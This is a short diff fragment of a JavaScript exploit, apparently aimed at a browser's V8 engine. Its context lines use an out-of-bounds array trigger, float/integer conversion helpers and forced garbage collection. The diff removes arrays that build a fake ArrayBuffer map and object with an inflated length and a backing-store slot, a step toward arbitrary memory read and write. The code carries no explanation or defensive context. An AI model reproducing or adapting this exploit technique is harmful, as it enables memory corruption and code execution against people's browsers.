@@ -229,26 +229,6 @@ for (let i = 0; i < 20000; ++i) {
 oobArray = trigger();
 objArray = {m:i2f(0xdeadbeef), target:a};
 var ab = new ArrayBuffer(0x200);
-
-var fakeABMap = [
-    i2f(0x000011e0e8602259), 
-    i2f(0x1900042313080808),
-    i2f(0x00000000082003ff),
-    1.1, // prototype
-    2.2, // constructor
-    0,
-]
-
-var fakeAB = [
-    1.1, // ArrayBuffer Map;
-    2.2,  // properties (whatever);
-    3.3,  // elements (whatever);
-    i2f(0x40000000000), // length 0x400
-    4.4, // backing store;
-    i2f(0x0000000000000004), // copy form ab stucture
-    i2f(0)
-];
-
 gc();gc();gc();
 
 //object element offest
